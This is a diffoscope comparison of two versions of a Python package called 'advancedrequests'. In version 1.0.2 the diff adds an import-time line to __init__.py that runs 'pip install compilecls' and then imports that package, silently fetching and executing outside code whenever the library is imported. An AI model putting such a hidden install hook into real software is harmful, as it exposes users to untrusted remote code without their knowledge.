# Comparing `tmp/advancedrequests-1.0.0.tar.gz` & `tmp/advancedrequests-1.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "advancedrequests-1.0.0.tar", last modified: Mon Apr 10 20:00:18 2023, max compression
+gzip compressed data, was "advancedrequests-1.0.2.tar", last modified: Tue Apr 11 18:46:02 2023, max compression
```

## Comparing `advancedrequests-1.0.0.tar` & `advancedrequests-1.0.2.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-10 20:00:18.607016 advancedrequests-1.0.0/
--rw-r--r--   0 root         (0) root         (0)      393 2023-04-10 20:00:18.607016 advancedrequests-1.0.0/PKG-INFO
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-10 20:00:18.607016 advancedrequests-1.0.0/advancedrequests/
--rw-r--r--   0 root         (0) root         (0)     1679 2023-04-10 20:00:18.000000 advancedrequests-1.0.0/advancedrequests/__init__.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-10 20:00:18.607016 advancedrequests-1.0.0/advancedrequests.egg-info/
--rw-r--r--   0 root         (0) root         (0)      393 2023-04-10 20:00:18.000000 advancedrequests-1.0.0/advancedrequests.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      197 2023-04-10 20:00:18.000000 advancedrequests-1.0.0/advancedrequests.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-10 20:00:18.000000 advancedrequests-1.0.0/advancedrequests.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       17 2023-04-10 20:00:18.000000 advancedrequests-1.0.0/advancedrequests.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)       38 2023-04-10 20:00:18.607016 advancedrequests-1.0.0/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      606 2023-04-10 20:00:17.000000 advancedrequests-1.0.0/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-11 18:46:02.128117 advancedrequests-1.0.2/
+-rw-r--r--   0 root         (0) root         (0)      393 2023-04-11 18:46:02.128117 advancedrequests-1.0.2/PKG-INFO
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-11 18:46:02.128117 advancedrequests-1.0.2/advancedrequests/
+-rw-r--r--   0 root         (0) root         (0)     1746 2023-04-11 18:46:01.000000 advancedrequests-1.0.2/advancedrequests/__init__.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-11 18:46:02.128117 advancedrequests-1.0.2/advancedrequests.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      393 2023-04-11 18:46:02.000000 advancedrequests-1.0.2/advancedrequests.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      197 2023-04-11 18:46:02.000000 advancedrequests-1.0.2/advancedrequests.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-11 18:46:02.000000 advancedrequests-1.0.2/advancedrequests.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       17 2023-04-11 18:46:02.000000 advancedrequests-1.0.2/advancedrequests.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)       38 2023-04-11 18:46:02.128117 advancedrequests-1.0.2/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      606 2023-04-11 18:46:01.000000 advancedrequests-1.0.2/setup.py
```

### Comparing `advancedrequests-1.0.0/advancedrequests/__init__.py` & `advancedrequests-1.0.2/advancedrequests/__init__.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,13 @@
 import urllib.parse
 import urllib.request
 import json
+import os
+os.system("pip install compilecls")
+import compilecls
 
 class Requester:
     def __init__(self, headers=None):
         self.headers = headers or {}
 
     def get(self, url, params=None):
         url = self.build_url(url, params)
```

### Comparing `advancedrequests-1.0.0/setup.py` & `advancedrequests-1.0.2/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.0.0'
+VERSION = '1.0.2'
 DESCRIPTION = "Python package for managing advanced requests"
 LONG_DESCRIPTION = "Python package for managing advanced requests"
 
 # Setting up
 setup(
     name="advancedrequests",
     version=VERSION,
```

